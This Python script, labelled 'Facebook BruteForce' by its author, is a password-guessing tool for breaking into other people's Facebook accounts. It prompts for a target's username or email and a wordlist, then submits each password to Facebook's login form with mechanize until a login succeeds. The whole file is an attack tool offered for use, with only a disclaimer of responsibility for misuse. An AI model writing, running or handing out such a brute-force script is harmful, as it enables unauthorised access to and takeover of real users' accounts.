#!/usr/bin/python3
# -*- coding: utf-8 -*-
        
        
#############################################
#                                           #
#    Facebook BruteForce, by NK TRICKER     #
#    Facebook Contact: Noman Karim          #
#                                           #
#############################################
















import time
import os
import mechanize

os.system('clear')
time.sleep(0.5)

try:
    import mechanize
except ModuleNotFoundError:
    print('[!] Module >Mechanize< Not Found!\n    Please install mechanize (pip install mechanize) and run the program with python3')
    exit()

time.sleep(0.5)
user = input('[💀] Target Username/ID/Email >> ')
time.sleep(0.8)
wrdlstFileName = input('\n[💀] Wordlist Type pk.txt >> ')

try:
    wordlist = open(wrdlstFileName, 'r')
except FileNotFoundError:
    print('\n[!] File Not Found!')
    exit()

time.sleep(0.8)
print(f'\n\nCracking {user} Now...')

time.sleep(1)
print('\nIM NOT RESPONSIBLE FOR ANY MISS USE XIDI\n')

for password in wordlist:
    password = password.strip()
    if not password:
        continue
    try:
        browser = mechanize.Browser()
        browser.set_handle_robots(False)
        browser.addheaders = [('User-agent', "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.36")]
        fb = browser.open('https://facebook.com')
        dos = open('Facebook-Log.txt', 'w+')
        browser.select_form(nr=0)
        browser.form['email'] = user
        browser.form['pass'] = password
        browser.method = 'POST'
        browser.submit()
        dos.write(browser.open('https://facebook.com').read())
        dos.seek(0)
        text = dos.read()
        if 'home_icon' in text:
            print(f'[+] Password Found > {password}')
            dos.close()
            os.remove('Facebook-Log.txt')
            exit()
        else:
            print(f"[!] Wrong Password! > {password}")
    except KeyboardInterrupt:
        print('\n#############################################\n   Exiting..')
        dos.close()
        os.remove('Facebook-Log.txt')
        exit()

time.sleep(1)
print('Sorry, none of the passwords in your wordlist is correct.')
time.sleep(0.8)
dos.close()
os.remove('Facebook-Log.txt')
exit()
